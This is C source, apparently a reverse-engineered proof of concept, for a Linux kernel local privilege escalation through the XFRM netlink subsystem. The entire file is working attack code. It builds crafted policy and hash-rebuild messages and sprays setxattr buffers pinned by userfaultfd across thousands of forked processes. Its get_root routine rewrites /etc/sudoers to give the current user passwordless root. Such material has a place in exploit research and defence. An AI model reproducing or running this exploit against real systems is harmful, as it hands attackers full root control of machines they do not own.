 nlm->nlmsg_type = XFRM_MSG_NEWSPDINFO;
 nlm->nlmsg_flags = NLM_F_REQUEST;
 nlm->nlmsg_pid = 0;

 char *p = NLMSG_DATA(nlm);
 /* DATA: flags */
 unsigned int pad = 0;
 memcpy(p, &pad, sizeof(pad));
 p += NLMSG_ALIGN(sizeof(pad));

 /* ATTR: XFRMA_SPD_IPV4_HTHRESH */
 struct nlattr nla;
 struct xfrmu_spdhthresh thresh4;
 memset(&nla, 0, sizeof(nla));
 memset(&thresh4, 0, sizeof(thresh4));
 nla.nla_len = sizeof(thresh4) + sizeof(nla);
 nla.nla_type = XFRMA_SPD_IPV4_HTHRESH;
 thresh4.lbits = 32;
 thresh4.rbits = 32;
 memcpy(p, &nla, sizeof(nla));
 p += sizeof(nla);
 memcpy(p, &thresh4, sizeof(thresh4));
 p += sizeof(thresh4);

 nlm->nlmsg_len = p - (char *)nlm;

 iov.iov_base = (void *)nlm;
 iov.iov_len = nlm->nlmsg_len;
 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 err = sendmsg(fd, &mh, 0);
 if (err == -1) {
  free(nlm);
  return -1;
 }

 free(nlm);
 return 0;
}

int xfrm_flush_policy0(void)
{
 int err;

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
 memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
 memset(&mh, 0, sizeof(mh));

 nlm->nlmsg_type = XFRM_MSG_FLUSHPOLICY;
 nlm->nlmsg_flags = NLM_F_REQUEST;
 nlm->nlmsg_pid = 0;

 char *p = NLMSG_DATA(nlm);
 /* DATA: nothing to do here */

 nlm->nlmsg_len = p - (char *)nlm;

 iov.iov_base = (void *)nlm;
 iov.iov_len = nlm->nlmsg_len;
 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 err = sendmsg(fd, &mh, 0);
 if (err == -1) {
  free(nlm);
  return -1;
 }

 free(nlm);
 return 0;
}

int xfrm_flush_policy1(void)
{
 int err;

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
 memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
 memset(&mh, 0, sizeof(mh));

 nlm->nlmsg_type = XFRM_MSG_FLUSHPOLICY;
 nlm->nlmsg_flags = NLM_F_REQUEST;
 nlm->nlmsg_pid = 0;

 char *p = NLMSG_DATA(nlm);
 /* DATA: nothing to do here */

 /* ATTR: XFRM_POLICY_TYPE */
 struct nlattr nla;
 struct xfrm_userpolicy_type upt;
 memset(&nla, 0, sizeof(nla));
 memset(&upt, 0, sizeof(upt));
 nla.nla_len = sizeof(upt) + sizeof(nla);
 nla.nla_type = XFRMA_POLICY_TYPE;
 upt.type = XFRM_POLICY_TYPE_SUB; /* the type we set index 0 */
 memcpy(p, &nla, sizeof(nla));
 p += sizeof(nla);
 memcpy(p, &upt, sizeof(upt));
 p += sizeof(upt);

 nlm->nlmsg_len = p - (char *)nlm;

 iov.iov_base = (void *)nlm;
 iov.iov_len = nlm->nlmsg_len;
 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 err = sendmsg(fd, &mh, 0);
 if (err == -1) {
  free(nlm);
  return -1;
 }

 free(nlm);
 return 0;
}

static void __xfrm_hash_rebuild(void)
{
 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 if (fd == -1) {
  perror(""socket"");
  return;
 }

 struct msghdr mh; /* 0x38 */
 int len = sizeof(struct nlmsghdr);
 int padding = NLMSG_ALIGN(sizeof(int));
 len += padding;
 len += sizeof(struct nlattr);
 len += sizeof(struct xfrmu_spdhthresh);
 char buf[len];
 struct iovec iov;
 memset(&mh, 0, sizeof(mh));
 memset(buf, 0, len);
 memset(&iov, 0, sizeof(iov));

 struct nlmsghdr *d0;
 d0 = (struct nlmsghdr *)&buf[0];
 struct nlattr *d1;
 d1 = (struct nlattr *)(buf + sizeof(*d0) + padding);
 struct xfrmu_spdhthresh *d2;
 d2 = (struct xfrmu_spdhthresh *)(buf + sizeof(*d0) +
     padding + sizeof(*d1));

 iov.iov_base = (void *)buf;
 iov.iov_len = len;

 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 d0->nlmsg_len = len;
 d0->nlmsg_type = 0x24; /* XFRM_MSG_NEWSPDINFO */
 d0->nlmsg_flags = 3; /* NLM_F_REQUEST | NLM_F_MULTI */
 d0->nlmsg_seq = 0;
 d0->nlmsg_pid = 0;
 d1->nla_len = sizeof(*d1) + sizeof(*d2);
 d1->nla_type = XFRMA_SPD_IPV4_HTHRESH;
 d2->rbits = 1;

 sendmsg(fd, &mh, 0);
 return;
}

static void __xfrm_flush_policy0(void)
{
 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 if (fd == -1) {
  perror(""socket"");
  return;
 }

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr nlm;
 memset(&mh, 0, sizeof(mh));
 memset(&iov, 0, sizeof(iov));
 memset(&nlm, 0, sizeof(nlm));

 iov.iov_base = (void *)&nlm;
 iov.iov_len = sizeof(nlm);

 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 nlm.nlmsg_len = sizeof(nlm);
 nlm.nlmsg_type = XFRM_MSG_FLUSHPOLICY;
 nlm.nlmsg_flags = 1;
 nlm.nlmsg_seq = 0;
 nlm.nlmsg_pid = 0;

 sendmsg(fd, &mh, 0);
 return;
}

static void __xfrm_add_policy0(void)
{
 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 if (fd == -1) {
  perror(""socket"");
  return;
 }

 struct msghdr mh;
 struct iovec iov;
 int len = sizeof(struct nlmsghdr);
 len += sizeof(struct xfrm_userpolicy_info);
 char buf[len];
 memset(&mh, 0, sizeof(mh));
 memset(&iov, 0, sizeof(iov));
 memset(buf, 0, len);

 struct nlmsghdr *d0;
 d0 = (struct nlmsghdr *)buf;
 struct xfrm_userpolicy_info *d1;
 d1 = (struct xfrm_userpolicy_info *)(buf + sizeof(*d0));

 iov.iov_base = (void *)buf;
 iov.iov_len = len;

 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 d0->nlmsg_len = len;
 d0->nlmsg_type = 0x13;
 d0->nlmsg_flags = 0x301;
 d0->nlmsg_seq = 0;
 d0->nlmsg_pid = 0;
 d1->sel.saddr.a6[0] = 0x80fe;
 d1->sel.saddr.a6[1] = 0;
 d1->sel.saddr.a6[2] = 0;
 d1->sel.saddr.a6[3] = 0xAA000000;
 d1->sel.family = AF_INET6;

 sendmsg(fd, &mh, 0);
 return;
}

static void __xfrm_add_policy1(void)
{
 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 if (fd == -1) {
  perror(""socket"");
  return;
 }

 struct msghdr mh;
 struct iovec iov;
 int len = sizeof(struct nlmsghdr);
 len += sizeof(struct xfrm_userpolicy_info);
 char buf[len];
 memset(&mh, 0, sizeof(mh));
 memset(&iov, 0, sizeof(iov));
 memset(buf, 0, len);

 struct nlmsghdr *d0;
 d0 = (struct nlmsghdr *)buf;
 struct xfrm_userpolicy_info *d1;
 d1 = (struct xfrm_userpolicy_info *)(buf + sizeof(*d0));

 iov.iov_base = (void *)buf;
 iov.iov_len = len;

 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 d0->nlmsg_len = len;
 d0->nlmsg_type = 0x19;
 d0->nlmsg_flags = 0x1;
 d0->nlmsg_seq = 0x70bd27;
 d0->nlmsg_pid = 0x25dfdbff;
 d1->sel.dport = 0x204e;
 d1->sel.dport_mask = 0x800;
 d1->sel.sport = 0x244e;
 d1->sel.family = AF_INET6;
 d1->sel.proto = 0xbe;
 d1->lft.soft_add_expires_seconds = 7;
 d1->lft.hard_add_expires_seconds = 7;
 d1->priority = 1;
 d1->index = 0x6e6bbc;
 d1->action = 1;
 d1->flags = 1;

 sendmsg(fd, &mh, 0);
 return;
}

int pipedes0[2];
int pipedes1[2];
int pipedes2[2];
#define SUBP_MAX 2000
#define SEM_MAX  300
int pid[SUBP_MAX];
sem_t *shmaddr;
int global_6031cc;

static void get_root(void)
{
 fprintf(stderr, ""running get_root\n"");
 struct passwd *p;
 p = getpwuid(getuid());
 if (!p) {
  perror(""getpwuid"");
  exit(-1);
 }

 char str[256];
 sprintf(str, ""%s\tALL=(ALL) \tNOPASSWD: ALL\n"", p->pw_name);

 chmod(""/etc/sudoers"", 0x1a0); /* TODO */
 int fd = open(""/etc/sudoers"", 0x401); /* TODO */
 if (fd == -1) {
  perror(""sudoers"");
  exit(-1);
 }

 write(fd, str, strlen(str));
 chmod(""/etc/sudoers"", 0x120); /* TODO */
 printf(""[+] current user %s was added to /etc/sudoers\n"", p->pw_name);
}

struct uffd_spray_data {
 int fd;
 int idx;
};
static void *uffd_spray_handler(void *arg)
{
 struct uffd_spray_data *o;
 o = (struct uffd_spray_data *)arg;

 struct pollfd pollfd;
 struct uffd_msg msg;
 ssize_t nr = -1;
 int fd = o->fd;
 int idx = o->idx;

 pollfd.fd = fd;
 pollfd.events = POLLIN;

 while (1) {
  int ready;
  int readc = 0;

  ready = poll(&pollfd, 1, -1);

  if (pollfd.revents & POLLERR)
   continue;

  if (!(pollfd.revents & POLLIN))
   continue;

  readc = read(fd, &msg, 0x20);
  if (readc == -1) {
   perror(""read userfaultfd"");
  }
  if (readc != 0x20)
   exit(1);

  void *addr;
  addr = (void *)(msg.arg.pagefault.address & 0xfffffffffffff000);
  sem_post(&shmaddr[idx + 1]);
  int c;
  read(pipedes0[0], &c, 1);

  struct uffdio_copy io_copy;
  char src[0x1000];
  io_copy.dst = (unsigned long)addr;
  io_copy.src = (unsigned long)src;
  io_copy.len = 0x1000;
  io_copy.mode = 0;
  if ((idx > (SEM_MAX - 1)) || (idx < 205)) {
   sleep(1);
   if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0)
    perror(""UFFDIO_COPY"");
  } else if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0) {
   perror(""UFFDIO_COPY"");
  }
  sleep(3);
  break;
 }

 return (void *)0;
}

static pthread_t uffd_setup(void *addr, unsigned long len,
    long flag, int idx)
{
 int err;
 int uffd;
 uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
 if (uffd == -1) {
  perror(""userfaultfd"");
  exit(-1);
 }

 struct uffdio_api io_api;
 io_api.api = UFFD_API;
 io_api.features = 0;
 err = ioctl(uffd, UFFDIO_API, &io_api);
 if (err == -1) {
  perror(""UFFD_API"");
  exit(-1);
 }
 if (io_api.api != UFFD_API) {
  fprintf(stderr, ""UFFD_API error\n"");
  exit(-1);
 }

 struct uffdio_register io_reg;
 io_reg.range.start = (unsigned long)addr;
 io_reg.range.len = len;
 io_reg.mode = UFFDIO_REGISTER_MODE_MISSING;
 err = ioctl(uffd, UFFDIO_REGISTER, &io_reg);
 if (err == -1) {
  perror(""ioctl UFFDIO_REGISTER"");
  exit(-1);
 }

 if ((io_reg.ioctls & 0x1c) != 0x1c) {
  fprintf(stderr, ""ioctl set is incorrent\n"");
  exit(-1);
 }

 struct uffd_spray_data *b;
 b = (struct uffd_spray_data *)malloc(8);
 b->fd = uffd;
 b->idx = idx;

 pthread_t ret;
 pthread_create(&ret, NULL, uffd_spray_handler, (void *)b);
 return ret;
}

static pthread_t spray_setxattr(int flag, int idx)
{
 pthread_t ret;
 void *addr;
 addr = mmap(NULL, 0x1000, 3, 0x22, -1, 0); /* TODO */
 if (!addr) {
  perror(""mmap"");
  exit(-1);
 }

 ret = uffd_setup(addr, 0x1000, flag, idx);
 sem_wait(&shmaddr[idx]);
 if (flag) {
  int c;
  read(pipedes1[0], &c, 1);
 }
 setxattr(""/etc/passwd"", ""user.test"", addr, 0x400, 1); /* TODO */
 return ret;
}

/*
 * the original program use these to get userns
 * open(""/proc/self/ns/pid"", 0);
 * ioctl(fd, NS_GET_USERNS);
 */
int main(int argc, char *argv[])
{
 key_t key;
 int shmid;
 int orig_gid;
 int stat_loc;

 //setup_sandbox();
 int fd;
 fd = open(""/proc/self/ns/pid"", O_RDONLY);
 if (fd == -1) {
  perror(""open"");
  return -1;
 }

 int err;
 err = ioctl(fd, 0xb701); /* TODO */
 if (err < 0) {
  global_6031cc = 1;
 }

 bind_on_cpu(0);

 key = ftok(""/dev/null"", 5);
 shmid = shmget(key, 0x25a0, 0x3a4); /* TODO */
 if (shmid < 0) {
  perror(""shmget"");
  exit(-1);
 }

 shmaddr = (sem_t *)shmat(shmid, 0, 0);

 for (int i = 0; i < SEM_MAX; i++) {
  sem_init(&shmaddr[i], 1, 0);
 }

 pipe(pipedes0);
 pipe(pipedes1);
 pipe(pipedes2);

 orig_gid = getgid();

 for (int i = 0; i < SUBP_MAX; i++) {
  pid[i] = fork();
  if (pid[i])
   continue;
  /* child process */
  close(pipedes0[1]);
  close(pipedes1[1]);
  close(pipedes2[1]);

  int tmpfd;
  tmpfd = open(""/proc/self/ns/pid"", O_RDONLY);
  if (tmpfd == -1) {
   perror(""open"");
  }

  if ((i > 0xf9) && (i < SEM_MAX)) {
   spray_setxattr(1, i);
   sleep(5);
   exit(0);
  } else if (i <= 0xf9) {
   spray_setxattr(0, i);
   sleep(5);
   exit(0);
  }

  sleep(8);
  if (setgid(orig_gid) < 0) {
   perror(""setgid"");
   exit(0);
  }

  sleep(5);
  if (!global_6031cc) {
   if (ioctl(tmpfd, 0xb701) < 0) {
    alarm(0);
    exit(2);
   }
  }

  if (!seteuid(0)) {
   setegid(0);
   get_root();
   exit(1);
  }
  exit(0);
 }
 if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
  perror(""unshare"");
  exit(-1);
 }

 sleep(2);
 sem_post(&shmaddr[0]);
 sleep(2);

 __xfrm_add_policy0();

 close(pipedes1[0]);
 close(pipedes1[1]);

 sleep(1);
 __xfrm_add_policy1();
 __xfrm_hash_rebuild();
 sleep(1); /* wait for xfrm_hash_rebuild() finish */

 __xfrm_flush_policy0();

 close(pipedes0[0]);
 close(pipedes0[1]);

 int status = -1;
 for (int i = 0; i < SUBP_MAX; i++) {
  waitpid(pid[i], &stat_loc, 0);
  if (WEXITSTATUS(stat_loc) == 1) {
   status = 0;
  } else if (WEXITSTATUS(stat_loc) == 2) {
   if (status)
    status = -2;
  }
 }
 shmctl(shmid, 0, 0);
 shmdt(shmaddr);
 if (status == -1) {
  fprintf(stderr, ""[-] failed\n"");
 } else if (!status) {
  fprintf(stderr, ""[+] get_root done\n"");
 }
 sleep(2);
 exit(status);
}

",https://raw.githubusercontent.com/snorez/exploits/refs/heads/master/xfrm_poc_RE_challenge/lucky0_RE.c,,,
